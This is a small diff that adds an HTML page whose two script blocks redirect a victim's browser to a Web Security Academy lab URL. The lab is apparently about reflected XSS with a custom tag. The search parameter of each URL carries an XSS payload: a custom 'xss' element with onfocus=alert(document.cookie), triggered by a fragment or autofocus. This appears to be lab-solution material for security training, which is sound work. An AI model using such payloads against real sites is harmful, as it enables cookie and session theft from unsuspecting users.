@@ -1,0 +1,9 @@
+
+
+<script>
+location = 'https://0a68004d0389c4b084e2ac9000f30026.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+<script>
+location='https://0a68004d0389c4b084e2ac9000f30026.web-security-academy.net/?search=<xss+autofocus+tabindex%3d1+onfocus%3dalert(document.cookie)></xss>';
+</script>
